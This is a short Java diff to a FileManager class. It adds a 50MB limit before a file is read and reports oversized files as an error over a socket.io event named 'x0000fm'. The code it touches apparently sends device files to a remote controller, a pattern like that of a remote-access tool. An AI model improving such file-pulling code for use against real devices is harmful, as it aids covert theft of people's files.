@@ -73,6 +73,19 @@ public class FileManager {
         File file = new File(path);
 
         if (file.exists()){
+            // Limit file size to 50MB to prevent OutOfMemoryError
+            long maxSize = 50 * 1024 * 1024; // 50MB
+            if (file.length() > maxSize) {
+                try {
+                    JSONObject object = new JSONObject();
+                    object.put("error", true);
+                    object.put("message", "File too large (max 50MB): " + (file.length() / 1024 / 1024) + "MB");
+                    IOSocket.getInstance().getIoSocket().emit("x0000fm", object);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                return;
+            }
 
             int size = (int) file.length();
             byte[] data = new byte[size];
